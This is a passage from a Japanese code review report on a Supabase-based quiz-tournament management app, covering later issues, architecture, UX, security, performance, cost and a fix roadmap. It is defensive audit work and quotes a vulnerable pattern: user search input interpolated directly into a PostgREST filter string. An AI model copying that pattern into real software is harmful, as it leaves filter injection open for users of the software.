### Issue 14: エントリー検索APIが特殊文字を含む検索語でPostgRESTのフィルタ構文を壊しうる

**Labels**: `backend`, `tech-debt`, `priority: low`
**Priority**: Low
**Confidence**: Medium（PostgRESTのフィルタ構文の一般的な制約に基づく論理的推測。実際のリクエストでの再現は未実施）

**Description**: `src/app/api/tournaments/[tournamentId]/entries/route.ts` のGETハンドラは、検索語 `q` を `` `display_name.ilike.%${q}%,email.ilike.%${q}%,affiliation.ilike.%${q}%` `` のようにテンプレートリテラルでPostgRESTの `.or()` フィルタ文字列へ直接埋め込んでいる。`q` にカンマ・括弧など PostgREST のフィルタ構文上の予約文字が含まれると、意図しないフィルタとして解釈されるか、構文エラーで500になる可能性が高い。呼び出しには`manage_entries`権限が必要なため悪用の実害は小さいが、正規の運営者が「,」を含む所属名などで検索した際に予期せず失敗する可能性があり、堅牢性の問題として残る。**修正方針**: Supabase JS SDKの `.or()` は文字列連結が前提の設計のため、特殊文字をエスケープするか、複数の `.ilike()` 呼び出しを `.or()` ではなく個別のクエリ＋アプリ側マージに置き換える。

---

### Issue 15: READMEの開発フェーズ表記が実装と大きく乖離している

**Labels**: `tech-debt`, `priority: low`
**Priority**: Low
**Confidence**: High

**Description**: README.mdは「Phase 1のみ完了」としているが、実際には`supabase/migrations`が0009まで存在し、CMS・エントリー・参加者・ラウンド・ルールエンジン・得点イベント・監査ログ・表示レイアウト・OBS連携（Phase 2〜8相当）がすべて実装済みである。ドキュメントと実態の乖離は、引き継ぎを受けた別のエンジニアが「まだ実装されていない」と誤認し、車輪の再発明や見落としを招くリスクがある。**修正方針**: READMEのチェックリストを実態に合わせて更新する。CI等で「migrationsのファイル数とREADMEのチェックボックス数の乖離を検知する」ような仕組みまでは過剰かもしれないが、少なくとも定期的な更新運用ルールを決めるべき。

---

### Issue 16: CMS画面の画像URLフィールド（`logo_url`/`main_visual_url`/`backgroundImageUrl`）にURLスキーム・ホストの検証がない

**Labels**: `security`, `frontend`, `priority: low`
**Priority**: Low
**Confidence**: Low（スタッフのみが入力可能なフィールドであるため実害は限定的。念のための指摘）

**Description**: `<img src={tournament.main_visual_url}>` や `DisplayRenderer.tsx` の `backgroundImage: url(${...})` は、値の形式を検証せずにそのままDOM/CSSへ埋め込んでいる。入力できるのはOWNER/ADMIN権限を持つ信頼された運営者に限られるため深刻度は低いが、URLの形式チェック（`https://`始まりの検証等）を入れておくことは、将来的に外部委託運営者など信頼度の異なるユーザーが増えた場合の保険になる。

---

## 6. Architecture Review

**良い点**:
- `profiles`（アカウント） / `tournament_members`（運営スタッフ） / `participants`（参加者） / `entries`（応募） を明確に別概念として分離しており、それぞれのマイグレーションのコメントに「なぜ分離したか」が明記されている。これは将来Root's Laboratory（コメントから察するに共通アカウント基盤を持つ計画があるようだ）との統合を見据えた、非常に見通しの良い設計。
- 得点計算を「イベントログからの純粋関数による再計算」として実装している点（`src/lib/rules/engine.ts`）は、Undo・監査・将来のルール変更耐性のいずれの観点からも優れた設計。`rule_config`をJSONBとして持ち、ルールをコードでなくデータとして扱う設計判断も、将来の大会形式追加に対する拡張性が高い。

**問題点**:
- 上述の通り、「役割ごとの権限」がRLS（DB層）とアプリ層（`can()`）の2箇所に部分的にしか実装されておらず、両者の対応関係を保証する仕組みがない（Issue #1, #6, #8）。これは今後テーブルが増えるたびに同じ穴が再発するリスクがある「設計上の負債」であり、優先的に是正すべき。
- `recomputeRoundParticipants`のような「複数テーブルにまたがる読み取り→計算→書き込み」処理が、Postgresのトランザクション・ロックを一切使わずNode.js側で複数回のDBラウンドトリップとして実装されている（Issue #2）。同様のパターンが今後の機能追加（例: 参加者の自動組分け、パーティションの再計算等）でも使われる可能性があり、都度レース条件を埋め込むリスクがある。DBロジックが必要な処理はPostgres関数（RPC）に寄せる方針を早めに確立すべき。

## 7. UX Review

未認証範囲でしか実地確認できていないため、ここではコードから読み取れる設計上の懸念点を中心に記載する。

- **致命的なミスにつながりうる箇所**: 得点操作画面の全ての操作系関数（`recordEvent`, `undo`, `moveQuestion`）が `fetch` のレスポンスステータスを確認していない（Issue #1で指摘）。大会本番でボタンを押したのに実は失敗していた、というのは「誤操作」以上に厄介な「無反応の誤操作」であり、UXとして最も避けるべきパターンの一つ。
- 得点操作画面には確認ダイアログが一切ない（「失格」ボタンも即実行）。ただし、これは早押しクイズの操作速度要求（数秒単位での操作）とのトレードオフであり、一概に「確認ダイアログを入れるべき」とは言えない。代わりに、Undo機能（`Ctrl+Z`）で直後に取り消せる設計になっている点は妥当なバランス感覚だが、Undoできる範囲が「直前の1件のみ」なのか複数件遡れるのかはUIから読み取れず、誤操作から遠いイベントまで遡って取り消したい場合の導線が弱い可能性がある（監査ログ画面から個別voidできるかは未確認）。
- ランディングページの欠如（Issue #11）は、初見でサービスの目的が理解できるかという評価基準に対し明確にマイナス。

## 8. Security Review

Issue #3（CSVインジェクション）、Issue #4（レート制限欠如）、Issue #6（RLSロール粒度の欠如）が本レビューにおける主要なセキュリティ上の発見である。XSS観点では、React標準のエスケープに一貫して依存しており `dangerouslySetInnerHTML` の使用箇所はリポジトリ内に一件も存在しなかった（確認済み、良い点）。認証まわりも `getUser()` による毎回の再検証、service roleキーの用途を1箇所（スタッフ招待時のメール検索）に限定するなど、意識的な設計がなされている。全体として「意図的に安全に倒そうとしている形跡」は随所にあるが、それが徹底し切れていない箇所（Issue #6, #7, #10, #13）が実運用上のリスクとして残る。

## 9. Performance Review

- `recomputeRoundParticipants` は、得点イベントが記録されるたびに **そのラウンドの全イベント履歴を毎回SELECTし直して再計算**している。ラウンドが長時間・多問題化した場合（例えば数百問の早押しラウンド）、イベント数が線形に増加するにつれ、1回の得点記録あたりの処理コストも線形に増加する（毎回O(N)の再計算）。数十人規模・数十問程度であれば実用上問題にならない可能性が高いが、長時間の大会や、決勝ラウンドを1つのroundとして延々と続けるような運用では、後半になるほど得点操作のレスポンスが遅くなることが予想される。**改善案**: 直近のスナップショット（例えば10問ごとの集計チェックポイント）を保持し、そこからの差分だけを再計算する方式への切り替えを、実際に体感遅延が問題になった時点で検討する。
- OBS表示画面 (`obs-display.tsx`) はSupabase Realtimeの `postgres_changes` を購読する設計であり、ポーリングよりは効率的。ただし複数のOBSソース（Main/Scoreboard/Final等、複数レイアウトを同時に配信する場合）がそれぞれ個別にRealtimeチャンネルを張ると考えられ、Supabase無料枠のRealtime同時接続数上限に大会規模によっては到達しうる（下記コストレビュー参照）。
- `entries`のエクスポート・一覧取得はページネーションなしで全件取得する設計（README・コード双方で「数十〜数百人規模を想定、将来大規模化したら見直す」と明記されており、現段階では妥当な判断）。

## 10. Cost Review

- **Realtime同時接続**: Supabase無料枠はRealtime同時接続数に上限がある。得点操作画面（複数オペレーター）・OBS表示（複数レイアウト×配信担当者の画面）・公開順位表を同時に開くと、1大会あたりの同時接続数は運営体制次第で無視できない数になりうる。大会規模が大きくなった場合にこの上限に抵触する可能性を運用ドキュメントに明記しておくべき。
- **公開エントリーAPIの無制限性**（Issue #4）は、悪意の有無にかかわらずコスト急増の最も直接的なリスク要因である。無料枠運用を謳う以上、最優先で対処すべき項目の一つ。
- **`recomputeRoundParticipants`のO(N)再計算**は、書き込み（write）回数自体は1回だが、読み取り（read）はラウンドのイベント数に比例して増加していく。Supabase課金がread/write回数ベースの場合、後半の問題になるほど1操作あたりのDBコストが増加する構造は、コスト予測を立てにくくする要因になる。

## 11. Positive Findings（良い点）

- `entries` / `participants` / `tournament_members` の概念分離と、その理由をマイグレーションコメントに明記する開発スタイル。将来この設計を変更する際にも「なぜこうなっているか」が追跡可能で、優れたドキュメント文化。
- `score_events`を追記専用のイベントログとして持ち、Undoを削除ではなく`voided_at`フラグで表現する設計。監査証跡を保ったまま訂正操作ができる、この種の競技運営ツールにとって理想的なパターン。
- 得点ロジック（`src/lib/rules/engine.ts`）・順位計算（`src/lib/scoring/ranking.ts`）・状態遷移（`round-status.ts`, `status.ts`）が、DBやReactに依存しない純粋関数として切り出され、`tests/unit`で単体テストされている。ロジックの正しさを個別に検証できる設計は保守性の観点で非常に優れている。
- 権限マトリクスをコードでなくデータ（`ROLE_ACTIONS`）として持つ設計は、新しいロールやアクションの追加を機械的な作業に落とし込んでおり、拡張性が高い（今回発見したRLSとの不整合は、このデータ自体の問題ではなく、RLS側がこのデータと同期していないことが原因である点に注意）。
- `getCurrentUser()`が`getUser()`（サーバー再検証）を使い、キャッシュされたJWTクレームを信頼しない実装になっている点。Supabase/JWTベース認証でありがちな「クライアントから送られたセッション情報を無条件に信じてしまう」誤りを回避できている。
- CSVエクスポートでUTF-8 BOMを付与し日本語Excelでの文字化けを防いでいる点など、実運用（特に日本語環境）を意識した細部への配慮がある。
- ラウンドのステータス遷移をDBトリガー（`check_round_status_transition`）でも二重に保証しており、アプリ層のバグがあってもDBレベルで不正な状態遷移を防ぐ、defense in depthの好例（同種の思想が#1/#6のRLSにも一貫して適用されていれば、今回指摘した問題の多くは発生しなかったはずである）。

## 12. Recommended Roadmap

依存関係とリスクの大きさを考慮し、単純なIssue数ではなく「何から手をつけるべきか」で整理する。

### 1. 今すぐ直すもの（本番投入前に必須、着手コストも比較的低い）
- **Issue #3**: CSVインジェクション対策（`csvEscape`の修正、数行の変更で完結）
- **Issue #1**: SCORE_OPERATORの「次問題へ」操作不能の修正（RLSポリシー追加、または専用RPC化）— 現状のままではSCORE_OPERATORロールの運用が事実上不可能なため最優先
- **Issue #6**: `round_participants`/`score_events`のRLSをロール粒度に修正 — #1の修正と合わせて、RLSポリシー全体を役割ベースで見直す設計変更を一度に行うのが効率的

### 2. 次に直すもの（本番運用を安定させるために重要）
- **Issue #2**: 得点再計算のレース条件解消（Postgres RPC化・アドバイザリロック導入）— #1/#6のRLS見直しと合わせてRPC化するのが自然な流れ
- **Issue #4**: 公開エントリーAPIへのレート制限・重複防止の追加
- **Issue #5**: スタッフの削除・ロール変更機能の実装

### 3. リリース前に直すもの
- **Issue #7**: `entry_form_fields`のDRAFT大会情報漏えい修正（1行のRLS修正）
- **Issue #9**: 大会ステータスに中止・訂正のための遷移を追加
- **Issue #13**: セキュリティヘッダーの追加
- **Issue #14**: エントリー検索の特殊文字対応
- 得点操作画面のエラーハンドリング追加（Issue #1に付随、`recordEvent`/`undo`/`moveQuestion`のレスポンスチェック）

### 4. 将来的に改善するもの
- **Issue #11**: ランディングページの新設
- **Issue #12**: Markdownレンダリングの実装（またはMarkdown表記の撤回）
- **Issue #15**: README更新
- **Issue #10**: スタッフ招待のユーザー列挙対策
- **Issue #16**: 画像URLフィールドの検証
- **Issue #8**: `rounds`テーブルの責務分割（現在の問題番号を別テーブルへ切り出す等のリファクタリング）
- パフォーマンス最適化（得点再計算のスナップショット化）は、実際にボトルネックが観測されてから着手で問題ない

---

以上が今回のコードレビューおよび限定的な実地調査に基づく総合レポートである。繰り返しになるが、**ログイン後の実際の操作画面（大会作成、得点操作画面の実機操作、モバイル/レスポンシブ表示、エラー時の挙動など）はテストアカウントなしでは検証できていない**。特にIssue #1・#2は、実際にテストアカウント（OWNER以外の各ロール）を用意した上でE2E的に再現確認することを強く推奨する。
